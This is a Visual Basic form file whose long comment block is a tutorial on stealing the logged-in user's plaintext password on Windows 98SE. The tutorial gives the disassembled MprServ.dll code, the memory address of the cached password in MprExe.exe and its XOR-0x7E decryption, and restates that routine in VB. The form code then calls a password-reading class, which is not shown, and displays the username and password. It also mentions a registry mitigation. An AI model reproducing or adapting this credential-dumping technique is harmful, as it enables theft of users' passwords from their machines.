VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Pass"
   ClientHeight    =   900
   ClientLeft      =   30
   ClientTop       =   270
   ClientWidth     =   1425
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   900
   ScaleWidth      =   1425
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command1 
      Caption         =   "GO"
      Height          =   732
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   1212
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

'this "program" shows a very simple hack
'HOW TO GET A USER(which is logged) PASSWORD IN Win98SE

'1.there is a very interesting API called OpenPasswordCache(mspwl32.dll) in Windows.
'This function has some arguments, but for us is the most
'important third parameter -> it is user password in a plain text

'and what can we do with this information? For the present nothing.
'(hmm yes we can monitor which APIs windows call - this method is very hard
'and we will use easier way to retrieve password)

'2.second thing which we know is that only MprServ.dll call this api (so again nothing usefull)

'3.and the last thing - we know that MprExe.exe uses MprServ.dll

'so that is all - now run some disassembeler and get asm code of mprserv.dll
'and look for imported API-seek OpenPasswordCache and look at arguments
'(DAMN what?)

'OK,this dll(mprserv.dll) uses some imported API(yes OpenPasswordCache too)
'so we MprServ load to disassembler (a used w32dasm) which will show dll source code in assembler
'then look for asm code calling OpenPasswordCache API

'

'---------------------------------------
':7FAD9B6F 6A01                    push 00000001 '4.this is the first argument
':7FAD9B71 68B0A1AE7F              push 7FAEA1B0 '3.this is the THIRD argument
':7FAD9B76 6810A1AE7F              push 7FAEA110 '2.this is the second argument
':7FAD9B7B 687061AE7F              push 7FAE6170 '1.this is the first argument
'
'* Reference To: MSPWL32.OpenPasswordCache, Ord:000Ah ->>> CALL function
'                                  |
':7FAD9B80 E845970000              Call 7FAE32CA
'----------------------------------------

'(note-arguments are passed in opposite order)
'this is the most important argument for us - memory pointer to password - 7FAEA1B0
'':7FAD9B71 68B0A1AE7F              push 7FAEA1B0

'!!!!!!! by the way the password in memory is crypted :-)

'if we will read the password from memory(7FAEA1B0) we will get some "bad" chars
'becasuse the password is crypted - do you remember?

'MprServ has to decrypt the password (when you logged in, windows
'crypt and save your password to memory - again pointer 7FAEA1B0 - so you can read
'the password when do you want - mprserv does not delete the password memory after calling OpenPasswordCache)
'and THEN MprServ call OpenPasswordCache with decrypted password

'so look for decrypting routine
'and here is the whole code(i deleted some needless instructions)

'CODE BEGIN----------------------------------------------
'7FAEA1B0 is a pointer to memory where is stored
'our crypted password(yes I say it again and again,ohh)

'mov eax, 7FAEA1B0 ->move 7FAEA1B0 to EAX (imagine EAX like a variable)
'je 7FAD9B6F       ->non-essential command

'HERE IS THE DECRYPTING ROUTINE
'******************************
'7FAD9B66: xor byte ptr [eax], 7E ->XOR EAX(EAX is a pointer to CHAR) with 7E( 7E is hexadecimal value)
'inc eax                          ->eax=eax+1 (eax is pointer - number)
'cmp byte ptr [eax], 00           ->if "current char"=chr(0) then set SOME FLAG to 1
'jne 7FAD9B66                     ->if "SOME  FLAG"=0 then goto 7FAD9B66
'******************************

'push 00000001 ->again our arguments
'push 7FAEA1B0 ->HERE IS THE PASSWORD
'push 7FAEA110
'push 7FAE6170
'* Reference To: MSPWL32.OpenPasswordCache, Ord:000Ah - call api
':7FAD9B80 E845970000              Call 7FAE32CA
'CODE END----------------------------------------------

'and now I rewrite asm decoding routine to VB(that's super:))
'sDecryptedPassword() is an array with our crypted password
'for example sDecryptedPassword(1)="X",sDecryptedPassword(2)="O",sDecryptedPassword(3)="R"

'    i=1
'10: sDecryptedPassword(i)=sDecryptedPassword(i) xor &7E                ->xor byte ptr [eax], &H7E
'    i=i+1                                                              ->inc eax
'    If sDecryptedPassword(i)=chr(0) then bFlag=true else bFlag=false   ->cmp byte ptr [eax], 00
'    If bFlag=false then goto 10                                        ->jne 7FAD9B66

'note-there is a null char at the end of our crypted password

'and then MprServ call OpenPassword with our decrypted password
'So our task will bee -
'1.read MprExe.exe memory  2.decrypt password
'that is all, simple :-)

'and now how can you protect your computer from this hack?
'create in the registry this key
'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Network
'with this value "DisablePwdCaching"=dword:00000001

'Now you know all, so that's all.
'
'                                        Libor
'&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

'class which reads password
Dim cPass As clsPassword

Private Sub Command1_Click()
Dim sPass As String, sUser As String
    'get password
    sPass = cPass.GetPassword
    'get user name
    sUser = cPass.GetUserName1
    'view result
    MsgBox "User name " & sUser & vbCrLf & "Password " & sPass, vbInformation, "Password"
End Sub

'create/destoy class
Private Sub Form_Load()
    Set cPass = New clsPassword
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Set cPass = Nothing
End Sub
